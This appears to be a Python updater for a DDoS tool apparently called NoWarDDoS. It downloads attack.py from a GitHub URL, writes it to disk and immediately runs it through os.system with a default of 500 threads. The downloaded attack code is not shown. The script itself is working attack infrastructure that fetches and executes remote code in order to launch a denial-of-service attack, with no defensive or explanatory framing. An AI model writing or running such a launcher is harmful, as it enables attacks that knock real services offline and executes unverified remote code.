from urllib.request import urlopen
import sys
import os
import requests

if len(sys.argv) > 1:
    threads = int(sys.argv[1])
else:
    threads = 500

def update():
    url = "https://raw.githubusercontent.com/AlexTrushkovsky/NoWarDDoS/main/attack.py"

    filename = url.split('/')[-1].replace(" ", "_")  # be careful with file names
    file_path = os.path.join('', filename)

    r = requests.get(url, stream=True)
    if r.ok:
        print("saving to", os.path.abspath(file_path))
        with open("attack.py", 'wb') as f:
            for chunk in r.iter_content(chunk_size=1024 * 8):
                if chunk:
                    f.write(chunk)
                    f.flush()
                    os.fsync(f.fileno())
    else:  # HTTP status code 4XX/5XX
        print("Download failed: status code {}\n{}".format(r.status_code, r.text))
    start_new()

def start_new():
    print("Success update")
    os.system("python attack.py " + str(threads))
    os.system("python3 attack.py " + str(threads))

if __name__ == '__main__':
    update()
